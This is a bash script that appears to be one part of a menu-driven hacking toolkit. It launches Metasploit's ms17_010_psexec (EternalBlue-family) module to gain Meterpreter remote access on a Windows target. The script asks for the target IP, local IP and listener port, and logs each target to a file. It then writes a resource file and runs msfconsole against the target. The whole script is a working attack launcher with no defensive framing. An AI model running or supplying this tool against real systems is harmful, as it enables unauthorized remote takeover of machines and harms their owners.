readrecent(){						#start read recent target function
	content=$(sed '1q;d' targetlist.txt)		#read first line of file
	echo "Your most recent target is $content"	#output previous target

}

saveTarget(){						#start save function
	sed -i "1 i $targ" targetlist.txt		#save target ip entered to file
}






echo -e "\e[31mEternal Blue Meterpreter remote access\e[0m"	#display exploit name
readrecent		#get most recent ip
read -p "TARGET IP:  " targ 								#ask for target ip
echo -e "\e[31mYour Local IP Address is:\e[0m "; hostname -I | awk '{print $1}'		#display local ip
echo -e "\e[31mWould you like to use this IP Address\e[0m(1)\e[31mor Specify Another?\e[0m(2)"
read -p "(1)/(2): " sel
#prompt user, use local ip or select another
case $sel in		#input validation

  	1)
  	loc=$(hostname -I)	#if 1 selected use local ip
    	;;

  	2)
	read -p "LOCAL IP: " loc	#if 2 selected ask user for new ip
    	;;
	*)
    	echo "Invalid Selection! ! !"	#if invalid response restart script
    	main
    	;;
	esac
clear
echo -e "\e[31mWould you like to use the default Local Port 4444 \e[0m (1) \e[31m Or Select Another?\e[0m (2)"	#ask user for port
read -p "(1)/(2): " sel
case $sel in	
	1)
	prt="4444"	#if 1 use default port
	;;
	
	2)
	read -p "Port: " prt	#if 2 ask user for port number
	;;
	
	*)
	echo -e "\e[31mInvalid Selection!\e[0m"	#if invalid restart script 
	main
	;;
	esac

printf "TARGET IP --> $targ\nLocal IP --> $loc\nPort --> $prt"	#show options configured
echo -e "\e[31mdo you wish to EXECUTE?\e[0m"	#ask user for consent to execute
read -p "(Y)/(N): " ready
case $ready in
	 Y)
	 	echo "EXECUTING"
	 	saveTarget $targ	#save ip
	 	echo "use exploit/windows/smb/ms17_010_psexec
	 	set RHOST $targ
	 	set LHOST $loc
	 	exploit" > etbl.sh		#write exploit configuration to resource file
	 	msfconsole -q -r etbl.sh #run exploit
	;;
	N)
		clear
		echo "Aborting"
		read -p "Do you wish to Return to the Menu (1) or Quit (2)?  " selection
		case $selection in 
		1)
		bash menu.sh
		;;
		2)
		echo "goodbye"
		;;
		*)
		echo "goodbye"
		;;
		esac 
	;;
	esac